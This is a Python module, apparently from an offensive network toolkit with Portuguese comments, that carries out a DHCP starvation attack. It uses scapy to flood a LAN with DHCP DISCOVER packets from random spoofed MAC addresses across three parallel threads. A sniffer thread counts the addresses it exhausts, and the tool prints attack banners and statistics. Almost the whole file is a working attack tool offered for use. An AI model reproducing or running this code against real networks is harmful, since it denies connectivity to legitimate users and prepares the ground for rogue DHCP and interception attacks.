# dhcpstarvation.py
import socket
import struct
import random
import time
import threading
import os
from scapy.all import *
import config as conf
from .utils import validate_interface, generate_random_mac, check_root_privileges

class DHCPStarvation:
    def __init__(self, interface=None, delay=0.1, verbose=False):
        self.interface = interface or conf.get_default_interface()
        self.delay = delay
        self.verbose = verbose
        self.running = False
        self.requests_sent = 0
        self.responses_received = 0
        self.allocated_ips = []
        self.start_time = None
        self.server_ips = set()
        
        # Validações
        if not check_root_privileges():
            print(f"{conf.YELLOW}[!] Aviso: Executando sem privilégios root. Pode haver limitações.{conf.RESET}")
        
        if not validate_interface(self.interface):
            print(f"{conf.RED}[!] Interface '{self.interface}' não encontrada ou inativa{conf.RESET}")
            raise ValueError(f"Interface inválida: {self.interface}")
        
    def generate_mac(self):
        """Gera um MAC address aleatório"""
        return generate_random_mac()
    
    def create_dhcp_discover(self, mac_addr):
        """Cria um pacote DHCP DISCOVER"""
        # Gerar transaction ID aleatório
        xid = random.randint(1, 0xFFFFFFFF)
        
        # MAC address em bytes
        mac_bytes = bytes.fromhex(mac_addr.replace(':', ''))
        
        # Ethernet header
        eth = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac_addr, type=0x0800)
        
        # IP header
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        
        # UDP header
        udp = UDP(sport=68, dport=67)
        
        # DHCP header
        dhcp_header = struct.pack(
            '!BBBBLHHLLLL16s64s128sL',
            1,          # op: BOOTREQUEST
            1,          # htype: Ethernet
            6,          # hlen: MAC length
            0,          # hops
            xid,        # xid: transaction ID
            0,          # secs
            0x8000,     # flags: broadcast
            0,          # ciaddr
            0,          # yiaddr
            0,          # siaddr
            0,          # giaddr
            mac_bytes + b'\x00' * 10,  # chaddr: client MAC + padding
            b'\x00' * 64,  # sname
            b'\x00' * 128, # file
            0x63825363  # magic cookie
        )
        
        # DHCP options
        options = b''
        options += b'\x35\x01\x01'  # DHCP Message Type: DISCOVER
        options += b'\x37\x03\x01\x03\x06'  # Parameter Request List
        options += b'\x0c\x08PurpleShiva'  # Hostname
        options += b'\xff'  # End option
        
        # Padding para alinhar
        while len(options) % 4 != 0:
            options += b'\x00'
            
        dhcp_packet = dhcp_header + options
        
        return eth / ip / udp / Raw(load=dhcp_packet)
    
    def create_dhcp_request(self, mac_addr, offered_ip, server_ip, xid):
        """Cria um pacote DHCP REQUEST"""
        mac_bytes = bytes.fromhex(mac_addr.replace(':', ''))
        
        eth = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac_addr, type=0x0800)
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        
        dhcp_header = struct.pack(
            '!BBBBLHHLLLL16s64s128sL',
            1, 1, 6, 0, xid, 0, 0x8000, 0, 0, 0, 0,
            mac_bytes + b'\x00' * 10,
            b'\x00' * 64, b'\x00' * 128, 0x63825363
        )
        
        options = b''
        options += b'\x35\x01\x03'  # DHCP Message Type: REQUEST
        options += b'\x32\x04' + socket.inet_aton(offered_ip)  # Requested IP
        options += b'\x36\x04' + socket.inet_aton(server_ip)   # Server Identifier
        options += b'\xff'
        
        while len(options) % 4 != 0:
            options += b'\x00'
            
        dhcp_packet = dhcp_header + options
        return eth / ip / udp / Raw(load=dhcp_packet)
    
    def parse_dhcp_response(self, packet):
        """Analisa resposta DHCP para extrair informações"""
        try:
            if packet.haslayer(Raw):
                data = bytes(packet[Raw])
                if len(data) >= 240:  # Tamanho mínimo DHCP
                    # Extrair IPs
                    yiaddr = struct.unpack('!L', data[16:20])[0]
                    offered_ip = socket.inet_ntoa(struct.pack('!L', yiaddr))
                    
                    siaddr = struct.unpack('!L', data[20:24])[0]
                    server_ip = socket.inet_ntoa(struct.pack('!L', siaddr))
                    
                    # Verificar magic cookie
                    magic = struct.unpack('!L', data[236:240])[0]
                    if magic == 0x63825363:
                        return offered_ip, server_ip
        except:
            pass
        return None, None
    
    def packet_handler(self, packet):
        """Handler para capturar respostas DHCP"""
        if packet.haslayer(UDP) and packet[UDP].sport == 67:
            offered_ip, server_ip = self.parse_dhcp_response(packet)
            if offered_ip and offered_ip != "0.0.0.0":
                self.responses_received += 1
                if offered_ip not in self.allocated_ips:
                    self.allocated_ips.append(offered_ip)
                
                if self.verbose:
                    print(f"\r{conf.GREEN}[+] IP alocado: {offered_ip} (Servidor: {server_ip}){conf.RESET}")
    
    def starvation_worker(self):
        """Worker thread para enviar requisições DHCP"""
        while self.running:
            try:
                mac_addr = self.generate_mac()
                discover_packet = self.create_dhcp_discover(mac_addr)
                
                # Enviar DISCOVER
                sendp(discover_packet, iface=self.interface, verbose=0)
                self.requests_sent += 1
                
                time.sleep(self.delay)
                
            except Exception as e:
                if self.verbose:
                    print(f"\r{conf.RED}[!] Erro enviando pacote: {e}{conf.RESET}")
                time.sleep(1)
    
    def print_stats(self):
        """Imprime estatísticas em tempo real"""
        while self.running:
            if self.start_time:
                elapsed = time.time() - self.start_time
                rate = self.requests_sent / elapsed if elapsed > 0 else 0
                
                stats = f"\r{conf.PURPLE}[*] Enviados: {self.requests_sent} | "
                stats += f"Respostas: {self.responses_received} | "
                stats += f"IPs únicos: {len(self.allocated_ips)} | "
                stats += f"Taxa: {rate:.1f}/s | "
                stats += f"Tempo: {int(elapsed)}s{conf.RESET}"
                
                print(stats, end='', flush=True)
            
            time.sleep(1)
    
    def start_attack(self, duration=None):
        """Inicia o ataque DHCP Starvation"""
        print(f"\n{conf.PURPLE}{'='*60}{conf.RESET}")
        print(f"{conf.PURPLE}{conf.BOLD} INICIANDO DHCP STARVATION ATTACK {conf.RESET}")
        print(f"{conf.PURPLE}{'='*60}{conf.RESET}")
        
        print(f"\n{conf.PURPLE}Configurações:{conf.RESET}")
        print(f"  Interface: {conf.GREEN}{self.interface}{conf.RESET}")
        print(f"  Delay: {conf.GREEN}{self.delay}s{conf.RESET}")
        print(f"  Duração: {conf.GREEN}{duration if duration else 'Ilimitada'}s{conf.RESET}")
        print(f"  Verbose: {conf.GREEN}{self.verbose}{conf.RESET}")
        
        try:
            self.running = True
            self.start_time = time.time()
            
            # Thread para capturar respostas
            capture_thread = threading.Thread(
                target=lambda: sniff(
                    iface=self.interface,
                    filter="udp port 67 or udp port 68",
                    prn=self.packet_handler,
                    stop_filter=lambda x: not self.running
                )
            )
            capture_thread.daemon = True
            capture_thread.start()
            
            # Thread para estatísticas
            stats_thread = threading.Thread(target=self.print_stats)
            stats_thread.daemon = True
            stats_thread.start()
            
            # Threads para envio de pacotes (múltiplas para aumentar taxa)
            workers = []
            for _ in range(3):  # 3 workers paralelos
                worker = threading.Thread(target=self.starvation_worker)
                worker.daemon = True
                workers.append(worker)
                worker.start()
            
            # Controle de duração
            if duration:
                time.sleep(duration)
                self.stop_attack()
            else:
                try:
                    while self.running:
                        time.sleep(1)
                except KeyboardInterrupt:
                    self.stop_attack()
                    
        except Exception as e:
            print(f"\n{conf.RED}[!] Erro durante ataque: {e}{conf.RESET}")
            self.stop_attack()
    
    def stop_attack(self):
        """Para o ataque"""
        self.running = False
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        print(f"\n\n{conf.PURPLE}{'='*60}{conf.RESET}")
        print(f"{conf.PURPLE}{conf.BOLD} ATAQUE FINALIZADO {conf.RESET}")
        print(f"{conf.PURPLE}{'='*60}{conf.RESET}")
        
        print(f"\n{conf.PURPLE}Resumo:{conf.RESET}")
        print(f"  Pacotes enviados: {conf.GREEN}{self.requests_sent}{conf.RESET}")
        print(f"  Respostas recebidas: {conf.GREEN}{self.responses_received}{conf.RESET}")
        print(f"  IPs únicos obtidos: {conf.GREEN}{len(self.allocated_ips)}{conf.RESET}")
        print(f"  Duração total: {conf.GREEN}{elapsed:.1f}s{conf.RESET}")
        
        if self.allocated_ips:
            print(f"\n{conf.PURPLE}IPs alocados:{conf.RESET}")
            for i, ip in enumerate(self.allocated_ips[:10], 1):  # Mostrar apenas os primeiros 10
                print(f"  {i:2d}. {conf.GREEN}{ip}{conf.RESET}")
            if len(self.allocated_ips) > 10:
                print(f"  ... e mais {len(self.allocated_ips) - 10} IPs")
        
        return {
            "requests_sent": self.requests_sent,
            "responses_received": self.responses_received,
            "allocated_ips": self.allocated_ips,
            "duration": elapsed
        }